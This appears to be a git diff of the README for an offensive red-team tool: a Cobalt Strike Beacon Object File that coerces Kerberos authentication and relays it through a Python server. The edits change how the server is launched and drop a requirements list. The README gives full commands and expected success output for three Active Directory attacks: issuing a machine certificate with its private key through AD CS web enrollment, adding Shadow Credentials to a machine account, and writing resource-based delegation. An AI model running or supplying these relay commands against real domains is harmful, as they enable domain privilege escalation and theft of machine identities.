@@ -8,14 +8,6 @@ A single-process Beacon Object File implementation of COM coercion and Kerberos 
 
 The Windows side is only a BOF. It does not upload an EXE, spawn a sacrificial process, inject code, or use sRDI/PIC.
 
-## Requirements
-
-- An x64 Cobalt Strike Beacon on the Windows target
-- A second Beacon when AD CS/the DC is only reachable through a pivot
-- Python 3 with `cryptography`; LDAP modes also use Impacket
-- AD CS Classic Web Enrollment and an enrollable machine template for ESC8
-- LDAP signing must not be enforced for direct LDAP modes
-
 The relay server stops after receiving the PFX or performing the directory write. It does not automatically request/import Kerberos tickets or execute the final S4U sequence.
 
 ## Build and load
@@ -54,10 +46,11 @@ The relay server must be listening before executing `krbrelay`.
 
 ## ESC8 usage
 
-Start the relay server:
+From the relay directory:
 
 ```bash
-proxychains4 -q python3 relay/relay_server.py esc8 \
+cd relay
+proxychains4 python3 relay_server.py esc8 \
   --port 9598 \
   --adcs-host CA.example.test --adcs-address 10.0.0.12 \
   --domain example.test --machine WORKSTATION \
@@ -75,8 +68,6 @@ For HTTPS Web Enrollment, add `--adcs-tls`. The SPN remains `http/CA.example.tes
 
 ### ESC8 success output
 
-Python must report both enrollment and PFX creation:
-
 ```text
 [*] IIS returned HTTP 200; the persistent HTTP connection is authenticated as the relayed machine account
 [*] ADCS issued request <ID>; retrieving the certificate on the authenticated connection
@@ -89,10 +80,11 @@ The PFX contains the issued certificate and matching private key.
 
 ## Shadow Credentials usage
 
-Route the relay server through proxychains:
+From the relay directory:
 
 ```bash
-proxychains4 -q python3 relay/relay_server.py shadowcred \
+cd relay
+proxychains4 python3 relay_server.py shadowcred \
   --port 9598 \
   --ldap-host DC01.example.test --ldap-address 10.0.0.11 \
   --domain example.test --machine WORKSTATION \
@@ -112,6 +104,8 @@ Expected success:
 [*] LDAP final bind succeeded; validating the queued directory write
 [+] Added Shadow Credential to WORKSTATION$
 [+] Saved passwordless shadow credential PKCS#12 to shadow-<ID>.pfx
+[+] Shadow Credential DeviceId: <GUID>
+[+] Shadow Credential KeyId: <SHA256 key identifier>
 [+] Shadow Credentials relay completed
 ```
 
@@ -119,10 +113,11 @@ Success requires result `0` for both the final LDAP bind and queued ModifyRespon
 
 ## RBCD usage
 
-RBCD requires the SID of an account you control that has an SPN, commonly a computer account whose password you know.
+RBCD requires the SID of an account you control that has an SPN, commonly a computer account whose password you know. From the relay directory:
 
 ```bash
-proxychains4 -q python3 relay/relay_server.py rbcd \
+cd relay
+proxychains4 python3 relay_server.py rbcd \
   --port 9598 \
   --ldap-host DC01.example.test --ldap-address 10.0.0.11 \
   --domain example.test --machine WORKSTATION \
@@ -229,4 +224,3 @@ Only two components participate in a relay:
 ## References
 
 - [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
-- [LocklessBof](https://github.com/antroguy/LocklessBof)
